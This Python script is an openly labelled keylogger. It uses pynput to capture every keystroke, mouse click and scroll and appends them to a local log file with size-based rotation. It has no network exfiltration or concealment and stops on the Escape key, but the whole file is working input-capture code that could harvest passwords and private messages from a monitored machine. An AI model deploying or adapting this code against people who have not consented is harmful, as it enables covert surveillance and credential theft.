from pynput import keyboard, mouse
import os
import time
import logging
import json

# Set up logging configuration
logging.basicConfig(filename='keylogger.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Configuration for keylogger settings
config_file = "config.json"
default_config = {
    "log_file": "keylog.txt",
    "max_log_size": 5 * 1024 * 1024,  # 5 MB
    "log_mouse": True,  # Enable mouse logging
}

# Load configuration from JSON file
def load_config():
    if os.path.exists(config_file):
        with open(config_file, "r") as file:
            return json.load(file)
    else:
        save_config(default_config)
        return default_config

# Save configuration to JSON file
def save_config(config):
    with open(config_file, "w") as file:
        json.dump(config, file, indent=4)

# Load settings
config = load_config()
log_file = config["log_file"]
max_log_size = config["max_log_size"]
log_mouse = config["log_mouse"]

# Lists to store pressed keys and mouse events
keys = []
mouse_events = []
shutdown_flag = False  # Flag to control the shutdown process

# Function to log the current time
def log_time():
    return time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())

# Function to create log file if it doesn't exist
def create_log_file():
    if not os.path.exists(log_file):
        with open(log_file, "w") as f:
            f.write("Keylogger started at: {}\n\n".format(log_time()))

# Function to check log file size and rotate if necessary
def check_log_file_size():
    if os.path.exists(log_file) and os.path.getsize(log_file) >= max_log_size:
        os.rename(log_file, f"keylog_{int(time.time())}.txt")  # Rename the old log
        create_log_file()  # Create a new log file

# Function to handle key press events
def on_press(key):
    try:
        keys.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            keys.append(' ')
        elif key == keyboard.Key.enter:
            keys.append('\n')
        elif key == keyboard.Key.backspace:
            keys.append('[BACKSPACE]')
        elif key == keyboard.Key.tab:
            keys.append('[TAB]')
        else:
            keys.append(f'[{key}]')

# Function to handle key release events
def on_release(key):
    global shutdown_flag  # Declare shutdown_flag as global
    if key == keyboard.Key.esc:
        shutdown_flag = True
        write_file()  # Write any remaining keys before exiting
        return False

# Function to write logged keys and mouse events to a file
def write_file():
    check_log_file_size()  # Check log file size before writing
    if keys or mouse_events:  # Only write if there are keys or mouse events to log
        with open(log_file, "a") as file:
            file.write("".join(keys))
            file.write("\n")  # Add a new line for readability
            file.write("\n".join(mouse_events))
            file.write("\n")  # Add a new line for readability
        keys.clear()  # Clear the keys list after writing to file
        mouse_events.clear()  # Clear mouse events after writing to file

# Create the log file if it doesn't exist
create_log_file()

# Function to log mouse click events
def on_click(x, y, button, pressed):
    if pressed:
        mouse_events.append(f"Mouse clicked at ({x}, {y}) with {button}")
    else:
        mouse_events.append(f"Mouse released at ({x}, {y}) with {button}")

# Function to log mouse scroll events
def on_scroll(x, y, dx, dy):
    mouse_events.append(f"Mouse scrolled at ({x}, {y}) by ({dx}, {dy})")

# Start the keylogger with event listeners
keyboard_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
keyboard_listener.start()

# Start mouse listener if logging is enabled
if log_mouse:
    mouse_listener = mouse.Listener(on_click=on_click, on_scroll=on_scroll)
    mouse_listener.start()

# Monitor logs and handle graceful exit
try:
    while not shutdown_flag:
        time.sleep(1)  # Keep the program running
        write_file()  # Write logs at defined intervals
except KeyboardInterrupt:
    shutdown_flag = True

finally:
    write_file()  # Write any remaining keys
    print("Keylogger exited and logs saved.")